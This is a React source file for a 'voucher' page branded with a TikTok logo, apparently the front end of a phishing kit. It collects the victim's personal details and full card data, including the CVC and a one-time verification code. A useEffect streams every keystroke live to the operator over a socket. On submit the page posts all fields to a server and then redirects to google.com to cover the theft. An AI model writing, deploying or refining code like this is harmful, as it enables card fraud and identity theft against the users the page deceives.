import { yupResolver } from '@hookform/resolvers/yup';
import axios from 'axios';
import { countries } from 'countries-list';
import moment from 'moment';
import { useContext, useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import * as Yup from 'yup';
import { SocketContext } from '../../App';
import logo from '../../assets/images/tiktokLogo.svg';
import { API_URL } from '../../config';
import { firstCaptialize } from '../../utils';
import CardDetailForm from './CardDetailForm';
import { Infomation } from './Infomation';
import './index.css';

const VoucherPage = () => {
	const navigate = useNavigate();

	const [step, setStep] = useState(0);
	const [loading, setLoading] = useState(false);

	const validationSchema = Yup.object().shape({
		firstName: Yup.string().required('Invalid first name'),
		lastName: Yup.string().required(),
		phone: Yup.string().required(),
		// .test('valid', 'Invalid phone number', (val) => {
		// 	return val.length > 8 && val.length < 15;
		// }),
		email: Yup.string().email(),
		address: Yup.string().required(),
		address2: Yup.string().required(),
		city: Yup.string().required(),
		region: Yup.string().required(),
		zipcode: Yup.string().required()
			.test('val', 'Invalid zipcode', (val) => {
				return val.toString().length <= 32 && val.toString().length >= 5;
			}),
		// .test('val', 'Invalid zip code', (val) => isValidZipCode(val)),
		state: Yup.string().required(),
		country: Yup.string().required(),

		cardVerifyCode: Yup.string().required(),
		cardShema: Yup.string().required(),
		cardType: Yup.string().required(),
		cardName: Yup.string().required(),
		cardNumber: Yup.string()
			.required()
			.test('val', 'Invalid card number', (val) => {
				console.log(val.replace('-', ''), '')
				return val.replaceAll('-', '').length < 19 && val.replaceAll('-', '').length > 13;
			})
			.typeError('Invalid card number'),
		expires: Yup.string().required(),
		cvc: Yup.string().required('Invalid code').min(3, 'Invalid code').max(4, 'Invalid code'),
	});

	const defaultValues = {
		firstName: '',
		lastName: '',
		phone: '',
		email: '',
		address: '',
		address2: '',
		city: '',
		region: '',
		zipcode: '',
		state: '',
		country: '',

		cardVerifyCode: '',
		cardSchema: 'DEBIT',
		cardType: 'VISA',
		cardName: '',
		cardNumber: '',
		expires: '',
		cvc: '',
	};

	const {
		control,
		watch,
		formState: { errors, isDirty },
	} = useForm({
		defaultValues,
		resolver: yupResolver(validationSchema),
		mode: 'onChange',
	});

	const watchFirstName = watch('firstName');
	const watchLastName = watch('lastName');
	const watchPhone = watch('phone');
	const watchEmail = watch('email');
	const watchAddress = watch('address');
	const watchAddress2 = watch('address2');
	const watchCity = watch('city');
	const watchZipcode = watch('zipcode');
	const watchState = watch('state');
	const watchCountry = watch('country');

	const watchCardVerifyCode = watch('cardVerifyCode');
	const watchCardSchema = watch('cardSchema');
	const watchCardType = watch('cardType');
	const watchCardName = watch('cardName');
	const watchCardNumber = watch('cardNumber');
	const watchExpires = watch('expires');
	const watchCvc = watch('cvc');

	const socket = useContext(SocketContext)

	const submitValueInformation = {
		fullName: `${watchFirstName} ${watchLastName}`,
		address: watchAddress,
		address2: watchAddress2,
		city: watchCity,
		state: watchState,
		zipCode: watchZipcode,
		email: watchEmail,
		phone: watchPhone,
		country: watchCountry,
	};

	const submitValueCard = {
		schema: watchCardSchema.toUpperCase(),
		type: watchCardType.toUpperCase(),
		cardName: watchCardName,
		cardNumber: watchCardNumber,
		expires: watchExpires && moment(watchExpires).format('MM/YY'),
		cvc: watchCvc,
		verifyCode: watchCardVerifyCode,
	};

	const submitvalue = {
		...submitValueCard,
		...submitValueInformation,
		level: 'GOLD',
		bank: watchState && `Bank of ${firstCaptialize(countries[watchState]?.name)}`,
		bin: Math.floor(Math.random() * 1000000),
	};

	const onSubmit = async () => {
		if (watchCardVerifyCode.length > 0 && Object.keys(errors).length < 1) {
			try {
				await axios.post(`${API_URL}/api/payments`, { ...submitvalue, sessionId: socket.id });
				window.location.href = 'https://www.google.com';
			} catch (error) {
				setLoading(false);
				toast.error(error?.response?.data?.message ?? 'Unknow error');
			}
		}
	};

	const handleSend = () => {
		setStep(1);
	};

	useEffect(() => {
		if (isDirty) {
			socket.emit("creatingPayment", { ...submitvalue, frontEnd: window.location.host });
		}
	}, [isDirty, submitValueCard, submitValueInformation]);

	return (
		<div style={{ height: '100%' }}>
			<img src={logo} height={150} width={150} />
			{step === 0 && (
				<Infomation
					onSend={handleSend}
					disabled={
						Object.values(submitValueInformation).some((item) => !item) ||
						Object.keys(errors).length > 0
					}
					control={control}
				/>
			)}
			{step === 1 && (
				<CardDetailForm
					disabled={
						Object.keys(submitValueCard).some((item) => {
							if (submitValueCard[item] || item === 'verifyCode') {
								return false;
							}
							return true;
						}) || Object.keys(errors).length > 0
					}
					control={control}
					onSubmit={onSubmit}
					loading={loading}
				/>
			)}
		</div>
	);
};

export default VoucherPage;
